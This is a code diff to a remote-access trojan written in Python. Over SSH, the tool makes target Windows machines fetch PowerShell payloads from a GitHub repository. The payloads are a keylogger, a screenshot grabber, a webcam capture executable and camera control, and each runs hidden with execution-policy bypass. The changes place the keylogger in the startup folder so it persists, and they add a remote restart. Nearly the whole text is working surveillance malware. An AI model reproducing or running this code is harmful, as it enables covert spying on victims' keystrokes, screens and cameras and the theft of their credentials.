@@ -63,11 +63,11 @@ def run_command(address, username, password, command):
     
 def payloads(address, username, password, temp, startup):
     print("[*] Starting install payloads ...")
-    payload_keylogger = f"powershell powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass \"Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/huynh044/RATProject/main/RAT/payloads/keylogger.ps1' -OutFile '{temp}/happy/system.ps1'\""
+    payload_keylogger = f"powershell powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass \"Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/huynh044/RATProject/main/RAT/payloads/keylogger.ps1' -OutFile '{startup}/system.ps1'\""
     payload_screenshot = f"powershell powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass \"Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/huynh044/RATProject/main/RAT/payloads/screenshot.ps1' -OutFile '{temp}/happy/system32.ps1'\""
     payload_camera = f"powershell powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass \"Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/huynh044/RATProject/main/RAT/payloads/CommandCam.exe' -OutFile '{temp}/happy/system.exe'\""
     payload_control_camera = f"powershell powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass \"Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/huynh044/RATProject/main/RAT/payloads/control_cam.ps1' -OutFile '{temp}/happy/coltrol_system.ps1'\""
-    payload_detect = f"powershell powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass \"Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/huynh044/RATProject/main/RAT/payloads/detect_action.ps1' -OutFile '{startup}/system.ps1'\""
+    payload_detect = f"powershell powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass \"Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/huynh044/RATProject/main/RAT/payloads/detect_action.ps1' -OutFile '{startup}/system32.ps1'\""
     run_command(address, username, password, payload_keylogger)
     run_command(address, username, password, payload_screenshot)
     run_command(address, username, password, payload_camera)
@@ -79,11 +79,7 @@ def payloads(address, username, password, temp, startup):
 def run_control_keylogger(address, username, password, temp, startup):
     print("[*] Starting run control keylogger ...")
 
-    run_control = f"start /MIN powershell powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass {temp}/happy/system.ps1"
-
-    control = f"cd {startup} && echo 'start /MIN powershell powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass {temp}/happy/system.ps1' && echo 'del system.cmd' > system.cmd"
-    run_command(address, username, password, control)
-    run_control = f"cd {startup} && start /MIN powershell powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass ./system.cmd"
+    run_control = f"start /MIN powershell powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass {startup}/system.ps1"
 
     run_command(address, username, password, run_control)
     print("[+] Keylogger running ...")
@@ -96,10 +92,6 @@ def screenshot(address, username, password, temp, startup):
     print("[*] Starting run control screenshot ...")
 
     run_control = f"start /MIN powershell powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass {temp}/happy/system32.ps1"
-
-    control = f"cd {startup} && echo 'start /MIN powershell powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass {temp}/happy/system32.ps1' && echo 'del system.cmd'> system.cmd"
-    run_command(address, username, password, control)
-    run_control = f"cd {startup} && start /MIN powershell powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass ./system.cmd"
     run_command(address, username, password, run_control)
     print("[+] Screenshot running ...")
     
@@ -109,9 +101,6 @@ def take_screenshot(address, username, password, path):
 def control_camera(address, username, password, temp, startup):
     print("[*] Starting control camera ...")
     run_control = f"start /MIN powershell powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass {temp}/happy/system.exe"
-    control = f"cd {startup} && echo 'start /MIN powershell powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass {temp}/happy/system.exe' && echo 'del system.cmd' > system.cmd"
-    run_command(address, username, password, control)
-    run_control = f"cd {startup} && start /MIN powershell powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass ./system.cmd"
     run_command(address, username, password, run_control)
     print("[+] Started camera . . .")
 
@@ -147,8 +136,6 @@ def connect(address, username, password):
 def restart_pc(address, username, password):
     os.system(f"sshpass -p \"{password}\" ssh {username}@{address} 'shutdown /r'")
 
-    
-
 def cli(args): 
     print(banner)
     print(read_config_file(args))
@@ -165,7 +152,7 @@ def cli(args):
             options = input(f"{header}")
             if options == "menu":
                 print(options_menu)
-            elif options == "quit":
+            elif options == "quit" or options == "exit":
                 terminated()
             elif options == "0":
                 connect(IPADDRESS, USERNAME, PASSWORD)
